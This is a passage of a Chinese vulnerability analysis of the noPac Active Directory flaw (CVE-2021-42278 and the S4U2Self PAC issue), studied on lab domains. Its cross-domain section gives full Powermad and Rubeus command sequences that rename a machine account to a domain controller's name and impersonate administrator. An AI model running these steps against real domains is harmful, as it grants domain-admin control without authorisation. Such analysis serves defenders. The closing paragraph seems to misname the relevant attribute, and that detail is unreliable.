(S4U2proxy)，这两个扩展都允许服务代表用户从KDC请求票证。S4U2self扩展允许服务代表特定的某用户向KDC请求该服务的可转发票据TGT。S4U2proxy可以以用户的名义请求其它服务的ST。想要使用s4u2self进行请求的前提条件是服务已经有通过KDC验证的TGT，约束委派就是限制了S4U2proxy扩展的范围。
下面是微软官方关于 S4U2self 和 S4U2proxy
工作过程的示意图，虚线上面为S4U2self，虚线下面为S4U2proxy，S4U2proxy主要用于服务委派。漏洞主要出在S4U2self。
PA-FOR-USER padata类型定义：
PA-FOR-USER字段是S4U2Self协议才有的字段
如果没有用到S4U2Self协议是pA-PAC-OPTIONS字段
KDC收到客户端发来的TGS-REQ S4U2Self协议，会重新生成PAC，然后放在ST服务票据中，并不是复制之前TGT里的PAC。
## 0x04 漏洞流程分析
使用上面的利用脚本进行抓包分析，此漏洞是利用kerberos流程中，处理S4U2Self时的逻辑问题和重新生成高权限的PAC问题。
AS-REQ：
可以看到在AS-REQ 里是允许携带pac的，并不是像利用工具名写的no pac。
AS-REP：
AS-REP为正常请求的返回包
我们看一下里面PAC信息，这里不具体说了，可以看一下上面的PAC结构。可以看到现在请求的是机器用户，并且Acct Name字段为域控的机器用户名（不加$）
TGS-REQ：
可以看到，具有SPN的账户也就是我们的机器账户，是以Administrator的身份请求服务票据
TGS-REP：
来看一下TGS-REP中的PAC内容，Acct Name变成了Administrator，User
RID为500，500为Administrator专有的sid后缀。Group RID为513，513为域用户组。
那么为什么Group RID为513而不是512域管组呢？我们看Administrator的属性可以发现，Administrator的主要组为Domain
Users ，而不是Domain Admins ，所以在TGS-REP中显示的是513而不是512。
我们将AS-REP的PAC与TGS-REP中的PAC进行对比可以发现AS-REP返回的PAC的权限为普通机器用户，而TGS-REP返回的PAC为Administrator权限
所以到这里这个漏洞是因为申请TGT后原来的机器账户消失，TGS找不到这个机器账户所以自动使用DC$的身份去创建ST，于是就生成了域管权限的ST。
###  总结
所以漏洞其实是首先创建一个机器用户。之后清空SPN为了不与域控的SPN重复，导致从而不能修改sAMAccountName。使用CVE-2021-42278对机器用户的sAMAccountName进行修改，修改为域控同样的机器名（不加$）,然后利用KDC处理S4U2Self请求时的漏洞进行重新生成PAC导致权限提升。
## 0x05 跨域
###  两个域为双向信任关系
A域：wjlab3.com
B域：wjlab2.com
A域域控：WIN-Q4E825O0UIA.wjlab3.com
B域域控：wjlab2dc1.wjlab2.com
假设现在拥有A域的普通域账号qt\wjlab3.com
我们测试的时候发现使用在A域与B域为双向信任关系的时候，通过A域的普通域账号可以在B域内创建机器用户
我们使用Powermad.ps1来进行演示
在A域内普通用户机器上，以当前普通域账号qt\wjlab3.com 在B域内创建一个qtwjlab  
`New-MachineAccount -MachineAccount qtwjlab -Domain wjlab2.com -Password
$(ConvertTo-SecureString "qwer1234" -AsPlainText -Force)`
清空qtwjlab的SPN信息  
`Set-DomainObject "CN=qtwjlab,CN=Computers,DC=wjlab2,DC=com" -Clear
'serviceprincipalname' -Verbose`
修改机器名称为B域域控的机器名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab" -Value "wjlab2dc1"
-domain wjlab2.com -Attribute samaccountname -Verbose`
向B域中请求的更改为域控名samaccountname的tgt  
`Rubeus.exe asktgt /user:"wjlab2dc1" /password:"qwer1234" /domain:"wjlab2.com"
/dc:"wjlab2dc1.wjlab2.com" /nowrap`
修改机器名称改为随便的用户名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab" -Value "qtwjlab"
-domain wjlab2.com -Attribute samaccountname -Verbose`
获取目标ST  
`Rubeus.exe s4u /self /impersonateuser:"administrator"
/altservice:"cifs/wjlab2dc1.wjlab2.com" /dc:"wjlab2dc1.wjlab2.com" /ptt
/ticket:[Base64 TGT]`
通过A域请求B域
###  子父域关系
父域：wjlab2.com
子域：user.wjlab2.com
父域域控：wjlab2dc1.wjlab2.com
子域域控：WIN-IAIF2RCT7UL.user.wjlab2.com
我们从子域的一台域内机器进行测试，用户为子域内的用户qq
在子域内普通用户机器上，以当前普通域账号qq\user.wjlab2.com 在父域内创建一个qtwjlab002  
`New-MachineAccount -MachineAccount qtwjlab002 -Domain wjlab2.com -Password
$(ConvertTo-SecureString "qwer1234" -AsPlainText -Force)`
清空父域中的qtwjlab002的SPN信息  
`Set-DomainObject "CN=qtwjlab002,CN=Computers,DC=wjlab2,DC=com" -Clear
'serviceprincipalname' -Verbose`
修改机器名称为父域域控的机器名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab002" -Value "wjlab2dc1"
-domain wjlab2.com -Attribute samaccountname -Verbose`
向父域中请求的更改为域控名samaccountname的tgt  
`Rubeus.exe asktgt /user:"wjlab2dc1" /password:"qwer1234" /domain:"wjlab2.com"
/dc:"wjlab2dc1.wjlab2.com" /nowrap`
修改机器名称改为随便的用户名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab002" -Value "qtwjlab002"
-domain wjlab2.com -Attribute samaccountname -Verbose`
获取目标ST  
`Rubeus.exe s4u /self /impersonateuser:"administrator"
/altservice:"cifs/wjlab2dc1.wjlab2.com" /dc:"wjlab2dc1.wjlab2.com" /ptt
/ticket:[Base64 TGT]`
通过子域普通用户请求父域域控
在这里我们可以看到此漏洞可以进行跨域利用，主要是因为通过信任域，在一个域中可以向另一个域进行域机器用户创建并修改其属性，从而导致可以利用。那么如果msDS-AdditionalDnsHostName
属性为0的话，那就无法创建机器用户，这个漏洞就利用不了了吗？如果域内管理员配置不当，导致某个域用户的ACL拥有了修改机器用户属性的权限，那么只要找到此用户就可以使用此用户进行利用。
## 0x06 参考